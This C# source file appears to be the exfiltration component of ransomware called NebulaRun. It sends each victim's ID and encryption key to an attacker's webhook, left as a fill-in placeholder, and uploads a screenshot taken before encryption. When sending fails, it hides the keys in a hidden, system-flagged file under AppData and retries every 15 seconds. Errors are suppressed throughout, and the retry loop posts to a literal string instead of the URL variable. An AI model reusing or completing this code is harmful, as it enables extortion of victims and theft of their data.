using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NebulaRun
{

public static class Send
{
        public static string WebhookUrl = "YOUR-WEBHOOK-HERE";
        private static readonly string QueueFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NebulaQueue.dat");

        public static void SendKeyAndIvAsync(string base64Key, string base64Iv, string Code)
        {
                bool sent = false;
                try
                {
                        using (HttpClient client = new HttpClient())
                        {
                                string jsonPayload = "{\"content\": \"ID: " + Code + "\\nKey: " + base64Key + "\"}";
                                StringContent val = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                                HttpResponseMessage resp = client.PostAsync(WebhookUrl, val).Result;
                                if (resp.IsSuccessStatusCode)
                                {
                                        sent = true;
                                }
                        }
                }
                catch
                {
                }

                if (!sent)
                {
                        SaveToQueue(base64Key, Code);
                        StartQueueWorker();
                }
        }

        public static void SendScreenshotAsync(string Code)
        {
                string screenshotPath = null;
                try
                {
                        screenshotPath = CaptureScreenshot();
                }
                catch
                {
                }

                if (screenshotPath != null && File.Exists(screenshotPath))
                {
                        try
                        {
                                using (HttpClient client = new HttpClient())
                                {
                                        using (MultipartFormDataContent form = new MultipartFormDataContent())
                                        {
                                                form.Add(new StringContent("ID: " + Code + "\nScreenshot (pre-encryption)"), "content");
                                                form.Add(new StreamContent(File.OpenRead(screenshotPath)), "file", Path.GetFileName(screenshotPath));
                                                HttpResponseMessage sresp = client.PostAsync(WebhookUrl, form).Result;
                                        }
                                }
                        }
                        catch
                        {
                        }
                        finally
                        {
                                try { File.Delete(screenshotPath); } catch { }
                        }
                }
        }

        private static string CaptureScreenshot()
        {
                try
                {
                        Rectangle bounds;
                        Screen[] screens = Screen.AllScreens;
                        if (screens.Length > 0)
                        {
                                int left = int.MaxValue;
                                int top = int.MaxValue;
                                int right = int.MinValue;
                                int bottom = int.MinValue;
                                foreach (Screen s in screens)
                                {
                                        Rectangle b = s.Bounds;
                                        if (b.Left < left) left = b.Left;
                                        if (b.Top < top) top = b.Top;
                                        if (b.Right > right) right = b.Right;
                                        if (b.Bottom > bottom) bottom = b.Bottom;
                                }
                                bounds = Rectangle.FromLTRB(left, top, right, bottom);
                        }
                        else
                        {
                                bounds = SystemInformation.VirtualScreen;
                        }

                        int width = bounds.Width;
                        int height = bounds.Height;
                        if (width <= 0 || height <= 0)
                        {
                                width = 1920;
                                height = 1080;
                                bounds = new Rectangle(0, 0, width, height);
                        }

                        string path = Path.Combine(Path.GetTempPath(), "nebula_screenshot_" + Guid.NewGuid().ToString("N") + ".png");
                        using (Bitmap bmp = new Bitmap(width, height))
                        using (Graphics g = Graphics.FromImage(bmp))
                        {
                                g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, new Size(width, height));
                                bmp.Save(path, ImageFormat.Png);
                        }
                        return path;
                }
                catch
                {
                        return null;
                }
        }

        private static void SaveToQueue(string base64Key, string Code)
        {
                try
                {
                        string data = Code + "|" + base64Key + "\r\n";
                        File.AppendAllText(QueueFilePath, data, Encoding.UTF8);
                        try
                        {
                                File.SetAttributes(QueueFilePath, FileAttributes.Hidden | FileAttributes.System);
                        }
                        catch
                        {
                        }
                }
                catch
                {
                }
        }

        private static void StartQueueWorker()
        {
                Task.Run(async delegate
                {
                        while (true)
                        {
                                await Task.Delay(15000);
                                try
                                {
                                        if (!File.Exists(QueueFilePath)) break;
                                        string[] lines = File.ReadAllLines(QueueFilePath, Encoding.UTF8);
                                        if (lines.Length == 0)
                                        {
                                                File.Delete(QueueFilePath);
                                                break;
                                        }

                                        List<string> remaining = new List<string>();
                                        using (HttpClient client = new HttpClient())
                                        {

                                                foreach (string line in lines)
                                                {
                                                        if (string.IsNullOrWhiteSpace(line)) continue;
                                                        string[] parts = line.Split('|');
                                                        if (parts.Length >= 2)
                                                        {
                                                                string vCode = parts[0];
                                                                string bKey = parts[1];
                                                                try
                                                                {
                                                                string jsonPayload = "{\"content\": \"[Offline Queue] ID: " + vCode + "\\nKey: " + bKey + "\"}";
                                                                StringContent val = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                                                                HttpResponseMessage resp = await client.PostAsync("WebhookUrl", val);
                                                                if (!resp.IsSuccessStatusCode)
                                                                {
                                                                        remaining.Add(line);
                                                                }
                                                                }
                                                                catch
                                                                {
                                                                        remaining.Add(line);
                                                                }
                                                        }
                                                }
                                        }

                                        if (remaining.Count == 0)
                                        {
                                                File.Delete(QueueFilePath);
                                                break;
                                        }
                                        else
                                        {
                                                File.WriteAllLines(QueueFilePath, remaining.ToArray(), Encoding.UTF8);
                                        }
                                }
                                catch
                                {
                                }
                        }
                });
        }
}

}
